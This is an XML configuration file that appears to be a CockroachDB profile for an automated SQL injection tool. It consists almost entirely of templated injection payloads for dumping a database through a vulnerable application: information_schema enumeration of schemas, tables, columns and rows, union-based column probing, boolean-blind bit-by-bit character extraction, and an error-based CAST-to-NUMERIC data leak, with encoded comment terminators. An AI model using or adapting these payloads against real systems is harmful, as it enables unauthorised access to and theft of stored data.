<?xml version="1.0" encoding="UTF-8"?>
<model>
    <vendor></vendor>
    <resource>
        <info>
concat_ws(
    '${ENCLOSE_VALUE_SQL}',
    version(),
    current_database(),
    '-'
)
|| '${TRAIL_SQL}'
        </info>
        <schema>
            <database>
select 
    concat_agg(
        '${ENCLOSE_VALUE_SQL}'
        || r
        || '${SEPARATOR_QTE_SQL}'
        || q::text
        || '${ENCLOSE_VALUE_SQL}'
        || '${SEPARATOR_CELL_SQL}'
    )
    || '${TRAIL_SQL}'
from (
    SELECT
        tables.table_schema r,
        count(table_name) q
    FROM information_schema.tables
    group by 1
    order by 1
    {limit}
) x
            </database>
            <table>
select
    concat_agg(
        '${ENCLOSE_VALUE_SQL}'
        || r
        || '${SEPARATOR_QTE_SQL}'
        || q::text
        || '${ENCLOSE_VALUE_SQL}'
        || '${SEPARATOR_CELL_SQL}'
    )
    || '${TRAIL_SQL}'
from (
    SELECT 
        tables.table_name r,
        '0' q
    FROM information_schema.tables
    where tables.TABLE_SCHEMA = '${DATABASE}'
    order by 1
    {limit}
) x
            </table>
            <column>
select 
    concat_agg(
        '${ENCLOSE_VALUE_SQL}'
        || r
        || '${SEPARATOR_QTE_SQL}'
        || q::text
        || '${ENCLOSE_VALUE_SQL}'
        || '${SEPARATOR_CELL_SQL}'
    )
    || '${TRAIL_SQL}'
from (
    SELECT 
        columns.column_name r, 
        '0' q
    FROM information_schema.columns
    where columns.TABLE_SCHEMA = '${DATABASE}'
    and columns.TABLE_name = '${TABLE}'
    order by 1
    {limit}
)x
            </column>
            <row>
                <query>
select 
    concat_agg(
        '${ENCLOSE_VALUE_SQL}'
        || r
        || '${SEPARATOR_QTE_SQL}'
        || q::text
        || '${ENCLOSE_VALUE_SQL}'
        || '${SEPARATOR_CELL_SQL}'
    )
    || '${TRAIL_SQL}'
from (
    SELECT 
        substr((${FIELDS}), 1, 775) r,
        count(*) q
    FROM ${DATABASE}.${TABLE}
    group by 1
    {limit}
)x
                </query>
                <fields>
                <field>trim(coalesce(${FIELD}::text, ''))</field>
                <concat>|| '%7f' ||</concat>
                </fields>
            </row>
        </schema>
    </resource>
    <strategy>
        <configuration>
            <slidingWindow>
select
    /**
     * If reach end of string (${LEAD}i) then NULLIF nullifies the result
     */
    '${LEAD}'
    || NULLIF(
        substr(
            (${INJECTION}),
            ${INDEX},
            65536
        ),
        '${TRAIL_SQL}'
    )
            </slidingWindow>
            <limit>limit 65536 offset ${LIMIT}</limit>
            <failsafe>(1337${INDICE}7330%2b1)::text</failsafe>
            <calibrator>repeat('%23', 1024)</calibrator>
            <limitBoundary>0</limitBoundary>
            <endingComment>--+</endingComment>
            <fingerprint>
                <errorMessage>cockroachdb</errorMessage>
            </fingerprint>
        </configuration>
        <normal>
            <indices>union select ${INDICES}</indices>
            <capacity>(select '${LEAD}${INDICE}' || ${CALIBRATOR})</capacity>
            <orderBy>order by 1337</orderBy>
        </normal>
        <boolean>
            <test>
                <false>true = false</false>
                <false>true %21= true</false>
                <false>false %21= false</false>
                <false>1 = 2</false>
                <false>1 %21= 1</false>
                <false>2 %21= 2</false>
                <true>true = true</true>
                <true>false = false</true>
                <true>true %21= false</true>
                <true>1 = 1</true>
                <true>2 = 2</true>
                <true>1 %21= 2</true>
                <initialization>0%2b1 = 1</initialization>
                <bit><![CDATA[
/**
 * true bit return bit, false bit return 0
 * 8 & 8 = 8, 8 & 4 = 0
 */
0 != (
    ascii(
        substr(
            (${INJECTION}), 
            ${INDEX}, 
            1
        )
    ) 
    %26 ${BIT}
)
                ]]></bit>
                <length>length((${INJECTION})) > ${INDEX}</length>
            </test>
            <blind>and ${TEST}</blind>
        </boolean>
        <error>
            <method>
                <name>CAST::text_numeric</name>
                <query>
/* Require FALSE statement, then OR */
and 1 = 0 
or 1 = CAST(
    (${WINDOW})::text 
    AS NUMERIC
)
                </query>
                <capacity>255</capacity>
            </method>
        </error>
    </strategy>
</model>